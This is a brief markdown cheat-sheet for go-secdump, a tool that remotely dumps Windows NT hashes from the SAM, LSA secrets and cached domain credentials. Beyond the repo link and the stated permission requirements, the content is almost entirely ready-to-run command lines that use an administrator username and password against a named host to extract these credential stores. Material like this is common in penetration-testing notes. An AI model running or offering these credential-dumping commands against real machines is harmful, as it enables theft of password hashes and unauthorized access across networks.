# Go-secdump

## Github repo: https://github.com/jfjallid/go-secdump

## Dump NT Hashes from SAM, LSA Secrets and Domain Cached Credentials remotely

## Requirements: Read permissions on SAM and SECURITY hives (usually only NT AUTHORITY\SYSTEM has these permissions) and local group administrators have WriteDACL on the registry hives.

### Usage:

#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local

### or

#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam --lsa --dcc2

#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --sam (Dump only SAM)

#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --lsa (Dump only LSA)

#### ./go-secdump --host DESKTOP-AIG0C1D2 --user Administrator --pass adminPass123 --local --dcc2 (Dump only DCC2 cache secrets)

